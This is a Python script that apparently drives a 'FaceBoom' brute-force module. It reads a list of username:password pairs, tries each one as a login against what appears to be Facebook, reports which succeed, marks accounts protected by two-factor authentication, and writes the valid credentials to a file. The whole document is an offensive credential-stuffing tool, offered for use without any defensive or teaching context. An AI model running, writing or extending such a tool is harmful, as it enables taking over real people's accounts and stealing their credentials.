from libraries import *
from bruteforce import FaceBoom
def extractValidAccounts(filename):
    faceboom = FaceBoom()
    with open(filename, 'r') as passwored_file:
        valid_accounts = []  # List to store valid accounts
        lines = passwored_file.readlines()

        for line in lines:
            line = line.strip('\n')
            username, passwored = line.split(':')

            print(WHITE + "[" + YELLOW + "~" + WHITE + "] Trying Passwored {"+ GREEN +passwored+WHITE+"} for User[ {" + YELLOW + str(username) + WHITE + "} ]")

            retCode = faceboom.login(username, passwored)
            if retCode:
                sys.stdout.write(WHITE + " ==> Login" + GREEN + " Success\n")
                print(WHITE + "=========================" + "=" * len(passwored) + "======")
                print(WHITE + "[" + GREEN + "+" + WHITE + "] Passwored [ " + GREEN + passwored + WHITE + " ]" + GREEN + " Is Correct :)")
                print(WHITE + "=========================" + "=" * len(passwored) + "======")
                if retCode == 2:
                    print(WHITE + "[" + YELLOW + "!" + WHITE + "]" + YELLOW + " Warning: This account uses (" + RED + "2F Authentication" + YELLOW + "):" + RED + " It's Locked" + YELLOW + " !!!")
                valid_accounts.append(f"{username}|{passwored}")  # Add valid account to the list

            else:
                sys.stdout.write(YELLOW + " ==> Login" + RED + " Failed\n")
        else:
            # Check if the loop completed without a successful login
            print(YELLOW + "\n[" + RED + "!" + YELLOW + "]" + WHITE + " Sorry: " + WHITE + "I Can't Find The Correct Passwored in the given file " + RED + ":(" + YELLOW + "!" + WHITE)
            print(gr + "[" + YELLOW + "!" + GREEN + "]" + YELLOW + " Please Try Another File. " + GREEN + ":)" + WHITE)
    # Save valid accounts to a separate file
    valid_accounts_filepath = input("Enter file path to save valid accounts: ")
    with open(valid_accounts_filepath, 'w') as valid_accounts_file:
        for account in valid_accounts:
            valid_accounts_file.write(account + '\n')
    sys.exit(1)
